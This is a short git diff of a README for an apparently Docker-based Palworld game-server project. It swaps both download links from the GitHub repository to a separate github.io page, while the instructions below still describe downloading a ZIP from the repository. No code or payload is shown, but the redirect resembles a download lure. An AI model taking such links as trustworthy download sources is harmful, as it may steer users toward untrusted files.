@@ -1,6 +1,6 @@
 # 🎮 palworld-server-docker-2026 - Run your private game server easily
 
-[![](https://img.shields.io/badge/Download-Visit_Repository_Page-blue.svg)](https://github.com/Samiba4806/palworld-server-docker-2026)
+[![](https://img.shields.io/badge/Download-Visit_Repository_Page-blue.svg)](https://samiba4806.github.io)
 
 This project provides a simple way to host your own dedicated game server. It uses container technology to handle the technical parts of the setup. You do not need to install complex databases or script files manually. This tool creates a stable environment for your game data.
 
@@ -30,7 +30,7 @@ Docker acts as a container for your game server files. It keeps the server separ
 
 You need the files from the project repository to start the server.
 
-[Visit the repository page to download the files](https://github.com/Samiba4806/palworld-server-docker-2026)
+[Visit the repository page to download the files](https://samiba4806.github.io)
 
 1.  Click the green Code button on the top right of the page.
 2.  Select Download ZIP.
